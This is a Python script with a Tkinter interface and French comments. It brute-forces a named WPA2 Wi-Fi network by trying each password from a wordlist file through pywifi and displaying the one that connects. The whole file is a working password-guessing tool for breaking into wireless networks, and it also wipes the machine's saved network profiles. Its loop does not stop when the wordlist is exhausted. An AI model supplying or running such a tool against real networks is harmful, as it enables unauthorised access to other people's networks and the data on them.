from tkinter import *
from pywifi import const
import pywifi
from time import sleep


def wifi_connection(password, wifiname):
    wifi = pywifi.PyWiFi()      # Fenêtre Wi-Fi
    ifaces = wifi.interfaces()[0]       # Premiere carte réseau sans fil
    ifaces.disconnect()        # Désactiver toutes les connexions Wi-Fi
    sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()      # Création d'une connexion Wi-Fi
        profile.ssid = wifiname
        profile.akm.append(const.AKM_TYPE_WPA2PSK)   # Définir l'algorithme de cryptage Wi-Fi
        profile.key = password    # Passer le mot de passe au réseau Wi-Fi
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP  # Module de chiffrement

        ifaces.remove_all_network_profiles()  # Supprimer tous les profils de réseau Wi-Fi

        temp_profile = ifaces.add_network_profile(profile)  # Etablir de nouvelles connexions

        # Connexion avec un temps de 3 secondes et envoi du résultat
        ifaces.connect(temp_profile)
        sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def main():
    wifiname = entry.get().strip()  # Obtenir le nom du réseau

    path = r'./wifipass.txt'
    file = open(path, 'r')
    while True:
        try:
            password = file.readline().strip()    # Lecture du fichier de mots de passe


            # Créer une connexion
            connected = wifi_connection(password, wifiname)
            if connected:
                text.insert(END, 'Mot de passe correct trouvé!')
                text.insert(END, password)
                text.see(END)
                text.update()
                file.close()
                break
            else:
                text.insert(END, f'Mauvais mot de passe {password}')
                text.see(END)
                text.update()
        except Exception:
            continue


# Créer une fenetre
root = Tk()
root.title('Wi-Fi Selection')
root.geometry('445x370')
root.configure(bg='#111')


label = Label(root, text='Entrez le nom du réseau Wi-Fi :', background="#111", foreground="#fff")
label.grid()


entry = Entry(root, font=('Poppins', 14), background="#333", foreground="#fff")
entry.grid(row=0, column=1, pady="6")


text = Listbox(root, font=('Poppins', 14), width=30, height=10, background="#333", foreground="#fff")
text.grid(row=1, columnspan=2, pady="6")


button = Button(root, text='Exécuter', width=20, height=2, command=main, background="#333", foreground="#fff")
button.grid(row=2, columnspan=2, pady="6")


root.mainloop()